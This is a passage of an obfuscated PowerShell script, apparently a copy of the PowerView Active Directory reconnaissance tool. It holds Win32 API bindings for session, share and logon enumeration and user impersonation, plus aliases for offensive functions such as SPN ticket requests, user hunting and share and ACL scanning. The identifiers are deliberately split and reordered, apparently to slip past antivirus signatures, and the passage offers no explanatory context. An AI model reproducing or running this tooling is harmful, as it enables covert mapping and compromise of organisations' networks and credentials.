            $ACL  =   ( [ADSI]$gpo.pAth  ).objeCTSECuriTY.aCCesS  | ? {$_.aCTiVeDirEcTORyRiGHts -match ( "{1}{0}"-f 'rite','W'  ) -and $_.ACcessCOntroLtyPE -eq (  "{0}{1}"-f 'Allo','w' ) -and  $Exclusions -notcontains $_.IDEnTItYRefEreNCE.toStRing(  ).sPLiT( "\" )[1] -and $_.iDeNTITyREFEreNCE -ne ( "{3}{2}{0}{1}" -f 'T','OR OWNER','A','CRE' )}
        if ( $ACL -ne $null){
            $GpoACL   =  New-Object ('p'  +  's' +  'object' )
            $GpoACL  |   Add-Member (  'Note'+'pr'+ 'ope' +  'rty'  ) (  "{1}{2}{0}" -f'th','ADSP','a') $gpo.pROpERTiES.adSPatH
            $GpoACL   |  Add-Member (  'Notepro' +  'p' +'erty' ) (  "{4}{2}{3}{1}{0}" -f'me','a','Dis','playN','GPO'  ) $gpo.properTies.displAYName
            $GpoACL   | Add-Member ('No' + 'teprope' + 'rt'  +  'y') ("{1}{0}{3}{2}" -f 'yRef','Identit','ce','eren') $ACL.IDentItYrEFEReNcE
            $GpoACL   |  Add-Member (  'N' +'otepr'  +'operty') (  "{3}{2}{1}{0}" -f'ghts','yRi','ctor','ActiveDire') $ACL.aCTiVEDIrECtOrYRIGHTS
            $GpoACL
        }
        }
    }
}











$Mod  = New-InMemoryModule -ModuleName (  'Win3' +  '2')




$SamAccountTypeEnum  =   psenum $Mod (  'Powe'+ 'r' +  'V'+ 'iew'+  '.SamAc'  + 'countTypeEnum' ) ('U'+'Int3'  +  '2') @{
    DOmaIn_objEct                    =   (  "{1}{2}{0}" -f'00','0x0000','00'  )
    GROup_obJecT                      =    ( "{1}{2}{0}"-f'000','0x100','00'  )
    nOn_sEcuRiTy_GROUp_ObjeCT       =   ("{1}{2}{0}" -f'01','0x10000','0')
    alIaS_OBjEct                     =   ( "{0}{2}{1}" -f'0x','0000000','2' )
    non_SecUrITY_ALiAs_ObjecT         =     ( "{1}{0}{2}" -f'x200','0','00001' )
    uSeR_oBjeCT                     =     (  "{1}{2}{0}" -f '00','0x3','00000')
    MaChINe_AccOUNt                 =     ("{2}{1}{0}"-f'00001','00','0x3' )
    trust_aCcouNT                     =     (  "{2}{1}{0}"-f'0002','00','0x30')
    APP_BAsIC_gRoup                 =   ("{3}{1}{0}{2}" -f'000','x400','00','0' )
    aPP_qUEry_GROup                  =    (  "{2}{1}{0}"-f'001','00','0x400' )
    AccOuNt_TYpe_Max                 =   ( "{1}{0}{2}"-f '7f','0x','ffffff' )
}


$GroupTypeEnum =  psenum $Mod (  'PowerView.Group'  + 'T'+ 'y'  +  'p'+'eE'  +  'n'+'um'  ) ( 'UInt'+'3' +  '2'  ) @{
    CrEaTED_bY_sYstem                 =   (  "{1}{2}{0}"-f'001','0','x00000' )
    GLOBaL_ScopE                      =    (  "{1}{0}{2}"-f'x0000','0','0002'  )
    DoMAIN_loCal_SCope              =    ( "{0}{1}{2}"-f'0','x0000000','4')
    unIversal_SCOPe                 =     (  "{1}{2}{0}"-f '008','0x','00000'  )
    ApP_bAsic                       =   (  "{0}{1}{2}"-f'0x00000','0','10' )
    aPp_qUERY                        =   ( "{1}{2}{0}"-f'020','0','x00000' )
    SEcUrITY                          =     ("{1}{0}{2}" -f'x','0','80000000'  )
} -Bitfield


$UACEnum =   psenum $Mod (  'Po' +  'werView.'  +  'U' + 'ACE'  +'num' ) ( 'UI'  +'nt32' ) @{
    SCRIPT                           =    1
    AccOuNTDiSabLE                  =     2
    hoMEdir_REQUIreD                =     8
    LoCKouT                          =    16
    pAsSWd_NotrEQd                  =   32
    paSSWd_cAnT_cHanGE               =     64
    encrYPtED_Text_PwD_alloWed        =     128
    TemP_DUpliCAte_aCCoUnT            =   256
    nORMAl_ACcoUNT                    =     512
    inteRDomaIN_trUsT_AcCouNT        =    2048
    WOrkStAtiON_TRUST_ACCOUNT       =   4096
    serVeR_trusT_AcCOUnt             =    8192
    dOnT_EXpIrE_PASSWORd             =    65536
    Mns_LOGoN_AccOuNt                =    131072
    smARTCArd_ReqUired              =     262144
    TRUSteD_For_deLEGATION            =    524288
    not_DElegAtED                   =     1048576
    UsE_DEs_key_ONly                =    2097152
    dont_req_PrEAUTh                  =    4194304
    PaSSWOrd_eXPiREd                 =   8388608
    tRuSTeD_to_AUth_fOR_DELeGaTiOn   =     16777216
    pArTIAL_secreTs_aCcounT          =   67108864
} -Bitfield


$WTSConnectState   =   psenum $Mod ( 'WTS_'+'C'  +  'ON' +  'NECTSTATE_C' +  'L'  +  'AS' +'S'  ) ('UI'+'nt16'  ) @{
    aCTive         =    0
    COnNecteD    =    1
    connectqUErY =     2
    shADoW        =     3
    diSCoNNEcTed  =     4
    Idle           =     5
    ListEn        =      6
    REsEt          =      7
    dOWn          =     8
    INiT          =      9
}


$WTS_SESSION_INFO_1 =   struct $Mod (  'P' +'ow' +'erV'  +  'iew'+  '.R'  +'DPSe' +'ssionInf'  +'o' ) @{
    EXEceNVid  =  field 0 (  'UI'  + 'nt32'  )
    STatE = field 1 $WTSConnectState
    sesSioNID =  field 2 ('U' + 'Int'+ '32' )
    PSeSSIONnaMe  = field 3 ('Stri'+ 'ng') -MarshalAs @(( "{0}{1}{2}" -f 'L','PW','Str'  ))
    PhoStnAMe   =  field 4 ( 'Stri' +'ng' ) -MarshalAs @(( "{0}{1}" -f 'LPWS','tr'))
    PUsernaME  =   field 5 ( 'Str'+'in'+'g'  ) -MarshalAs @((  "{1}{2}{0}"-f 'WStr','L','P' )  )
    pDoMaINnaMe =  field 6 ( 'Strin'+ 'g'  ) -MarshalAs @(( "{0}{1}" -f 'LPWS','tr' )  )
    PfaRMnAMe  =   field 7 (  'Stri'  +  'ng') -MarshalAs @((  "{0}{1}"-f 'L','PWStr')  )
}


$WTS_CLIENT_ADDRESS  =  struct $mod (  'W'  +  'TS_CLIEN'  +  'T'+ '_AD' +'DRE'  +  'SS' ) @{
    addreSsfamILy  =   field 0 ('UInt3' +  '2'  )
    ADDResS  =   field 1 ('By' +'t'+'e[]' ) -MarshalAs @(( "{2}{1}{0}"-f'y','yValArra','B'), 20  )
}


$SHARE_INFO_1   =  struct $Mod (  'Po' +  'werV' +'ie'+ 'w'+  '.Shar'+'e' +  'Info'  ) @{
    NAME =   field 0 ('S'  + 'tri' +'ng') -MarshalAs @(("{0}{1}" -f 'LPWSt','r' ) )
    TyPE   =   field 1 ('UI'  +'nt32'  )
    rEmArk  = field 2 ('Strin' +'g'  ) -MarshalAs @((  "{0}{1}" -f'L','PWStr' ))
}


$WKSTA_USER_INFO_1   =  struct $Mod ('PowerView.LoggedO' +  'n'+  'Use'  + 'r'+  'In' +'f' +'o' ) @{
    usErnaMe  = field 0 ( 'St' +'r'+ 'ing') -MarshalAs @(( "{2}{1}{0}"-f'tr','PWS','L'  )  )
    LOGoNdomAIN =  field 1 ('St'+  'ring' ) -MarshalAs @(("{0}{2}{1}" -f'LP','Str','W' ))
    aUthdoMAins  =   field 2 ('Str'+  'ing'  ) -MarshalAs @(( "{1}{0}" -f 'WStr','LP')  )
    loGonsERVeR   =   field 3 (  'Str'  +  'ing'  ) -MarshalAs @(("{0}{1}" -f'LPW','Str'  )  )
}


$SESSION_INFO_10  = struct $Mod ('Pow' +  'erVi'  + 'e'  +'w.Se'  +'ssi' +'onInfo'  ) @{
    cnAMe  =  field 0 ( 'Str'+'in'  + 'g') -MarshalAs @(( "{1}{0}"-f'Str','LPW' )  )
    usERnAme  =   field 1 (  'St' + 'ri'  + 'ng') -MarshalAs @((  "{1}{0}"-f'tr','LPWS' ))
    Time   =  field 2 ('UInt3' + '2'  )
    IdletIme =  field 3 ('UI' +'n'  +'t32'  )
}


$SID_NAME_USE   =  psenum $Mod (  'SID_'+ 'NA' +  'ME'  + '_USE') (  'U' + 'Int16'  ) @{
    siDTYpeUsEr               =   1
    SIdTyPEgrouP             =   2
    SIDtYPedOmaiN            =   3
    siDtYpeALiAS             =   4
    sidTyPEwellknoWngrouP    =   5
    SiDTypEDeleTedACcoUnT     =   6
    SIDtypEINvAlId          = 7
    SiDTypeunknown           =  8
    sidTYpEcOmPUTER           =   9
}


$LOCALGROUP_INFO_1  =  struct $Mod ('L'+ 'OCA'+ 'LGROUP'+ '_INFO'+  '_1' ) @{
    lGrpi1_NAME  =   field 0 (  'S'+'tring') -MarshalAs @(("{1}{0}"-f'Str','LPW'  ) )
    LgRPi1_CoMmEnT   =   field 1 ( 'St'  +  'ring') -MarshalAs @(( "{0}{1}"-f 'L','PWStr'  ) )
}


$LOCALGROUP_MEMBERS_INFO_2   =  struct $Mod ('LOCAL'+  'GRO'+  'UP'+ '_MEMBE' + 'RS_INFO_2'  ) @{
    LGrmI2_Sid =  field 0 ( 'In' +  'tPt'+ 'r'  )
    LgRmi2_siDusAGE  = field 1 $SID_NAME_USE
    lgRMI2_DoMaINAndnaME  =   field 2 ('St'+'ring') -MarshalAs @(( "{0}{1}"-f 'LPWS','tr'  )  )
}


$DsDomainFlag  =   psenum $Mod (  'DsDo'  +'ma'+'in.Flags' ) ( 'UI' +  'nt32') @{
    in_fOrEST         = 1
    DIRECt_outbOUnD =  2
    TREE_ROOT        = 4
    PrIMaRY          = 8
    nATIVE_mOdE     =   16
    direct_INBound    =  32
} -Bitfield
$DsDomainTrustType  =   psenum $Mod ( 'DsD'  +'om'  +'ain.Tru'+'stTyp' + 'e'  ) ('UInt'  + '32' ) @{
    doWnLevEl    =  1
    uPLEVeL       =   2
    MIt         = 3
    dcE          =  4
}
$DsDomainTrustAttributes  =  psenum $Mod ( 'D'  +  'sDoma' +  'in.'  +  'TrustA'+  'ttribut'  +  'e'  +'s'  ) (  'UIn'  +  't32') @{
    nON_TrAnSITIve       = 1
    upLeVEl_onLY         = 2
    FILtEr_SIDS         = 4
    ForESt_trAnSiTiVE   = 8
    cROsS_ORGaNizATion  =   16
    WIThIn_FOrEst       = 32
    TrEaT_as_EXTERnaL     = 64
}


$DS_DOMAIN_TRUSTS = struct $Mod ( 'DS'  + '_DOM'+  'AIN_TRUS'+'TS'  ) @{
    netbiosdOmAinnAmE  =  field 0 ( 'Str'+ 'ing' ) -MarshalAs @((  "{2}{0}{1}" -f 'PW','Str','L' ) )
    DnSDomaInnAMe   = field 1 ( 'Str' +  'ing') -MarshalAs @(( "{1}{0}" -f'r','LPWSt'  ))
    flags   =  field 2 $DsDomainFlag
    parenTIndeX  = field 3 ('UIn' +'t3'  + '2' )
    truStTyPE  = field 4 $DsDomainTrustType
    TRuSTattrIBUTeS  =  field 5 $DsDomainTrustAttributes
    doMaiNSId   =   field 6 ('In' + 'tP' + 'tr')
    domaINgUID   = field 7 ( 'G'  + 'uid'  )
}


$NETRESOURCEW   =   struct $Mod ('NETRESOUR'+'CE'  +'W' ) @{
    DwsCoPE  =           field 0 (  'UIn'+  't32')
    dWTYpe   =            field 1 (  'UI'  +  'n' +  't32'  )
    DWDisPLayTyPE  =     field 2 ( 'UIn' +'t32' )
    dWUsage   =           field 3 ( 'U' + 'In'  + 't32')
    LpLOcaLNaME   =     field 4 ( 'Str'  +'ing'  ) -MarshalAs @(( "{1}{0}" -f'r','LPWSt'  ))
    LPremoTeNAmE  =      field 5 ('S'+  'tring' ) -MarshalAs @(("{2}{0}{1}"-f 'WS','tr','LP'))
    lPcoMmEnt  =         field 6 ('St'  + 'ring' ) -MarshalAs @(( "{1}{0}"-f 'tr','LPWS'))
    lPpRoVider  =        field 7 ('Str'+ 'ing' ) -MarshalAs @(( "{0}{1}"-f 'LP','WStr'  ) )
}


$FunctionDefinitions   =   @(
    (func ('net' +  'api32') ('NetShare' +  'E'+'nu'  + 'm' ) (  [Int]  ) @([String], [Int], [IntPtr].MakEbyreftyPE(   ), [Int], [Int32].makeByReFtYpe( ), [Int32].MakeByRefTYpE(   ), [Int32].MAKeByreFtYPE(  ) )  ),
    (func ( 'netapi3'  +  '2'  ) (  'Ne' +  'tWkstaU'+ 's'+ 'erEnum'  ) ( [Int] ) @([String], [Int], [IntPtr].MAkebyReFTyPE(  ), [Int], [Int32].MaKebyreFtYPe(  ), [Int32].maKeBYreFTyPE(    ), [Int32].MAkeByREftyPe(  )) ),
    (func ( 'ne'  + 'tapi3'+  '2' ) ( 'Net'+'Se' +'s'+  'sionE' +'num' ) ([Int]) @([String], [String], [String], [Int], [IntPtr].MAkeByreFtYpE( ), [Int], [Int32].MAkeBYreFtyPE(  ), [Int32].mAkEbyreftYPe(  ), [Int32].mAkEbyREFTyPE(   ) )  ),
    (  func ('n'  +  'etapi' +  '32'  ) ('Net'+  'LocalG'+ 'r'+ 'oupEnum' ) (  [Int] ) @([String], [Int], [IntPtr].mAKebyrEFTypE(  ), [Int], [Int32].maKeByREfTYpE( ), [Int32].makEbYREftYpe( ), [Int32].MaKEBYREfTYPe() ) ),
    (  func ('ne'+  't'+  'api32') ('Net' +'L' + 'o'  + 'calGrou' +'pGetM' +'embers' ) (  [Int]  ) @([String], [String], [Int], [IntPtr].maKEByrEFTypE(  ), [Int], [Int32].MaKebYREFtYPe( ), [Int32].makeByREFTypE(  ), [Int32].mAkeByREfTYpe(   )  )),
    (func ( 'net'  +'api32') (  'DsGetSi'+'t' +  'eName'  ) ( [Int]  ) @([String], [IntPtr].MAkEBYrEftYPe(  ) ) ),
    (  func ( 'n'  +  'etap'+'i32'  ) ('D'  +  'sEnumer' + 'at' + 'eD'  + 'o'+'mainTrus'  + 'ts'  ) (  [Int] ) @([String], [UInt32], [IntPtr].MaKEBYrEFTYpE(   ), [IntPtr].MakEByREFtYPe(  ) ) ),
    (func ('n'+ 'etapi3'  + '2'  ) ( 'Ne'+'tApiB'+ 'ufferF'  +'ree') (  [Int]) @([IntPtr])),
    (func ('a' + 'dvapi'+'32') (  'C' + 'onver'+'t'  +'SidT' +'o'+  'Stri'  + 'ngSid'  ) ([Int] ) @([IntPtr], [String].MakEbYrEFtyPE(   ) ) -SetLastError ),
    (  func (  'advap'+ 'i3' +  '2' ) ( 'Op' +'e'  +'nSCMan'  +  'agerW') ([IntPtr]  ) @([String], [String], [Int]) -SetLastError  ),
    (func ('adva'+'pi3'  +'2') (  'Clo'+ 's' +'eSe'  + 'rviceHandle') (  [Int]  ) @([IntPtr]) ),
    ( func (  'adva'  + 'pi3'  +'2' ) (  'L'  +  'ogon'+'User'  ) ([Bool] ) @([String], [String], [String], [UInt32], [UInt32], [IntPtr].mAkebYrEfTYpe( )  ) -SetLastError),
    (  func ('ad'  + 'v' + 'api32'  ) (  'Impers'+ 'ona' +  'teLog' + 'g'+'edOnUser' ) ([Bool] ) @([IntPtr] ) -SetLastError ),
    (func ('adva'+ 'p' +'i32') ('Rev' +  'e'  + 'rtT'+  'oSelf' ) (  [Bool]  ) @() -SetLastError ),
    (func (  'wtsapi3'  +'2') ('WTSOpenS'+ 'e' +'rv' +'erEx') (  [IntPtr]  ) @([String]  )),
    (  func ( 'wt' + 'sapi32'  ) ( 'W' +'TSEnu'+  'merateSess' +  'i'  +'o'  +'nsEx'  ) ([Int] ) @([IntPtr], [Int32].maKEbYrEFtyPE(  ), [Int], [IntPtr].MAkeBYREFtYPe(   ), [Int32].mAkebYREFtypE(    ) ) -SetLastError  ),
    (func (  'w' + 'ts'  +'api32'  ) ('WT'+ 'SQuer' +  'yS' +  'es' + 'sionInformat' + 'ion') (  [Int]  ) @([IntPtr], [Int], [Int], [IntPtr].maKeBYRefType(   ), [Int32].mAKeBYreFType(  )  ) -SetLastError  ),
    (func (  'w'+'tsa'+'pi32' ) (  'WTSFree' + 'MemoryE'  +'x' ) (  [Int]) @([Int32], [IntPtr], [Int32] ) ),
    ( func ('wt'  +'sap' +  'i32'  ) ('WT'  +'SF'+'re'+'eMemory'  ) (  [Int]) @([IntPtr])),
    ( func ('wt' +  'sapi3'  +'2' ) (  'WT'+ 'SC'+ 'los'  +  'eServer'  ) ( [Int]) @([IntPtr]) ),
    (func ('M'+ 'pr') ( 'WN' +'e'  + 'tAdd'+'Connection2W') ([Int] ) @($NETRESOURCEW, [String], [String], [UInt32]) ),
    (  func (  'Mp' +'r') ('WN' +  'et' +  'Can'  +  'celConnection2' ) ( [Int]) @([String], [Int], [Bool]  ) ),
    (func ('ker' +'n'+  'el32') ( 'Close'  +  'Ha' + 'n'  + 'dle') ([Bool] ) @([IntPtr]  ) -SetLastError )
  )

$Types   = $FunctionDefinitions  | Add-Win32Type -Module $Mod -Namespace ( "{1}{0}"-f'2','Win3'  )
$Netapi32 =   $Types[( "{0}{1}" -f'neta','pi32' )]
$Advapi32   = $Types[( "{1}{0}" -f'2','advapi3'  )]
$Wtsapi32 =  $Types[("{0}{1}{2}" -f 'wts','a','pi32'  )]
$Mpr = $Types['Mpr']
$Kernel32   = $Types[( "{0}{1}"-f'kern','el32'  )]

Set-Alias ( 'Get-'+  'IPAd'+ 'dress') ( 'Res'  +  'olve'  + '-IP' + 'Addre'  + 'ss')
Set-Alias ('Co'+ 'nve' +'rt-'+'NameToSi'  + 'd') ( 'C' +  'onvertTo-S'  +'ID'  )
Set-Alias ('Con' +  'vert-Si' +'dT' +'oName' ) ( 'C' +'o' + 'nve' + 'rtFrom-SID'  )
Set-Alias ('Reques'  +  't' + '-SPNTic'+  'k'+  'et'  ) ( 'Ge'  +  't-Doma'+'inSPN'+ 'T' + 'icket'  )
Set-Alias ('Get-DNS' +'Z'+  'o' +'ne' ) (  'G'+ 'et-D' + 'omain'+  'DNS'  + 'Zone')
Set-Alias (  'Get-'+  'DN'+'SRec'+'ord' ) ( 'Get'  + '-D'  +  'omainDNSR'  + 'e' +'cord')
Set-Alias (  'G'+ 'e' +  't' +'-NetDo'+  'main'  ) (  'Get-Dom'+ 'a'  +'in')
Set-Alias (  'G'  +  'et-Ne' +  't'+ 'D' +'omain'+  'Controll'  +'er' ) ('Get'+ '-Dom' + 'ai' +  'n' + 'Cont'+  'roll'+'er'  )
Set-Alias ('Ge'  + 't-NetFores'+ 't' ) ( 'G'+  'et-For' +  'est'  )
Set-Alias ( 'Get' +  '-'  +  'NetFo'  +  're'  +  'st'+'Domain' ) ( 'Get-For' +  'es' + 'tDom'+ 'ain' )
Set-Alias ('Ge'  +  't'+'-'+'NetFor'+ 'estCa' +'talog') ( 'Get-For' +  'estGlob'+  'al' +  'C'+ 'at'  + 'a'  +'l' +  'og'  )
Set-Alias ( 'Get'+'-' + 'Ne'+  'tUser' ) ('Ge' +  't' +'-DomainUser')
Set-Alias ( 'Get-U'  +'serE' +  'ven'  +  't'  ) ('Get-D'+ 'o'  + 'mainUse' +'rEve'+ 'nt')
Set-Alias ('Get-Ne'  + 't'  + 'Co'  + 'mputer'  ) (  'Ge'  +  't-DomainCo'  +'mp'  +'uter' )
Set-Alias ('Get-AD'+'Obje'+'ct') (  'Get'  + '-Domai'  +'n'  + 'Object'  )
Set-Alias (  'Set-AD'+ 'Obje' +  'ct') ( 'Set-Dom'  + 'a' +  'inOb'+'ject')
Set-Alias (  'G' + 'et-' +  'ObjectAcl') (  'G'  +  'e' +  't-Dom'+  'ainOb'  + 'jectAc' +'l'  )
Set-Alias ( 'Add-' +  'Obj'  +  'ect' +  'Acl') ('A' + 'dd-' +'D' + 'oma' +  'inObje'+  'ctAc' +  'l' )
Set-Alias ( 'Inv'+'oke-' +'ACLS'  +'ca'+'nner'  ) ('F'+ 'ind-'+  'InterestingD'+  'omai'+  'n'+  'A' +  'cl' )
Set-Alias ('G'+  'et-GUIDM' + 'ap'  ) (  'Ge'  +'t' +  '-'+  'Do'+ 'main'  +  'GUIDMap' )
Set-Alias ( 'G'+  'et'+ '-NetO'  +'U') ('Get-'  + 'Domain' +'O'  +'U')
Set-Alias ('Get-'  +'NetSit' + 'e' ) ('G'  +'et-Dom'+ 'a' + 'inSite')
Set-Alias (  'Get-'+'N'+'etSubnet') (  'Ge'  +  't-'  + 'Domai'+'nSubnet'  )
Set-Alias (  'Get-' + 'Net'  +'G' +'roup' ) ('Get-DomainG'  +  'r'  +  'oup' )
Set-Alias (  'Fin' +  'd-' + 'Man'+  'agedSecur'  +  'it' +'yG'  + 'roup' +'s' ) ('Get-D' +'o'  +'m'  +  'a'  +'inManagedSecurityG'+  'roup' )
Set-Alias (  'Ge' +'t-Ne'+'tGroup'  +  'Me'  +  'mber') ('G'+'et-'+ 'Dom'  +  'ai'  + 'nGroupMemb' +'er'  )
Set-Alias ('Get-'+ 'NetFile' +  'S' +'er'  +'ve'+  'r') ( 'Ge'  +  't-D' +'omainFile' +'Server' )
Set-Alias ( 'Ge'+  't-DFSsh'  +  'a' +  're'  ) ( 'Ge'  +  't-DomainD' +'F' +  'SSh' +  'are')
Set-Alias ( 'G'+ 'et' +'-NetGPO') (  'Get'+'-' +  'Doma' +'inGPO')
Set-Alias ('G'  + 'e' + 't-NetGPOGr'  +  'oup' ) ( 'Ge'+  't-DomainG'+'PO' + 'LocalGr'+  'o' +  'up'  )
Set-Alias ('Fi' +'n'+ 'd-GPOL'  +  'o'+  'cation') (  'Get-D'  +'oma' +'inG'+  'P'  + 'O' +'UserLocalGroupMapping'  )
Set-Alias ( 'F'+ 'ind'  + '-GP'  +  'OCompu'+  'terAd'+'min'  ) ( 'Get' +  '-DomainGPOCom' + 'p' +  'ute' + 'r'+'Lo' +'cal' + 'G' + 'roupMap'  +  'p'  +  'ing'  )
Set-Alias ( 'G'+'et-Lo'+  'gged' + 'OnLocal'  ) ( 'Get-R' +  'egLo'  + 'ggedOn'  )
Set-Alias ('Invoke-C'+  'h'+ 'e'+ 'ckL' + 'oc' + 'alAd'+ 'minA'+ 'cc'  +'ess'  ) ( 'Te'  +'st-Admi'  +  'nA'+  'ccess'  )
Set-Alias (  'Ge'  +  't-S' +  'iteNam'+ 'e' ) (  'G'+'et-Ne'+ 't' +  'Comput' +  'erSiteName' )
Set-Alias ( 'G' +'et'  + '-Proxy' ) (  'Ge' + 't-WM'  + 'IRegProxy')
Set-Alias ('G' + 'e' +'t-Las'  + 'tLogged'  +  'On') (  'G' + 'e' +  't-WMIRegLastLog'+ 'ge'  +  'd'  + 'On'  )
Set-Alias ( 'Ge'+'t-Ca'+'c' +  'hedRDPCon' + 'nec'+'tion' ) (  'Get-WMI' + 'Reg'  +  'Cac'+  'hedRDPC'+  'onnection')
Set-Alias (  'G' +  'e' + 't-R' +'eg' + 'istryMou'+'n' +'tedD'+ 'rive' ) ('G'  + 'et' +  '-WM' +'IR' + 'egMou' +'n' +'tedDrive'  )
Set-Alias (  'Get-NetP'  + 'r'  + 'oce' +  'ss') ('Get'  +'-'  +  'W' +'MIPro'+'cess' )
Set-Alias ('I'+  'nvo' +  'k' +  'e-Thread'  +  'edF' +  'uncti'  + 'on') neW-ThReAdEd`F`Unc`TioN
Set-Alias ('I' + 'n'+  'vo'  +  'ke-User'  +'Hunter'  ) ( 'Fin'+  'd-Dom'  +'ain'  + 'Us'  +  'erLocation'  )
Set-Alias ( 'Invoke-'  + 'Pr' +'oc'+ 'e'+  'ssHunter') (  'Fin'  +'d-D'+  'omain' +  'Pro'  +  'cess'  )
Set-Alias ( 'I' + 'nv'  + 'oke-'+'Ev'+  'entH'  + 'unter') ('F' +  'ind-D'  + 'omainUser'  +'Ev' + 'ent'  )
Set-Alias (  'In'  + 'voke'+'-' + 'ShareFi'+ 'nder'  ) ( 'Fin'+  'd-' +'D'  + 'oma'+ 'inS'  +  'hare')
Set-Alias ( 'Invoke-FileFin'  + 'd' +'e' +'r'  ) (  'Fin'+  'd-In'  + 'tere'  +'sti' + 'ngDomain' + 'Sh'  +'ar'+ 'eFile'  )
Set-Alias (  'In'  +'vok'+'e-Enum'  +  'era'  +'teLoca'+'lAdmin') ( 'Fin'  +  'd-D'  +'om'  +'a'  +  'inL'+'ocalGroupMember'  )
Set-Alias ( 'Ge'  +  't-N' +'e'+ 'tDomain'  + 'Tr' +  'ust' ) (  'Get' +'-Dom'+ 'ainTru' +  'st')
Set-Alias ('Get' +  '-Net' + 'Fore'+ 'st'  +  'Trust'  ) ('Get-F'  + 'ores' +  't'+  'Trust' )
Set-Alias ( 'Find' +'-' +  'Forei'+  'g' +'nUser'  ) ('Get-Do'+  'mai'  + 'nFo' + 'reignUs' +'e'  + 'r')
Set-Alias (  'Find'+'-Fore'+ 'ignGr' +'ou'  +  'p' ) ('Get' + '-D'  +  'o'  +  'mainFor' +  'eign'  + 'Gro'+  'upM' +'ember')
Set-Alias (  'I'  +  'nvoke-'  +'Ma'+'p'  + 'Dom'+  'ainTrust'  ) ( 'Get-Do'  +  'ma'+'in'+  'Trust'  +'Mappi' + 'ng')
Set-Alias ('Get-' + 'Domain' +  'Po'  +  'lic'  +'y'  ) ('G'+  'et-DomainP' +  'olic'  + 'yDa' + 'ta'  )

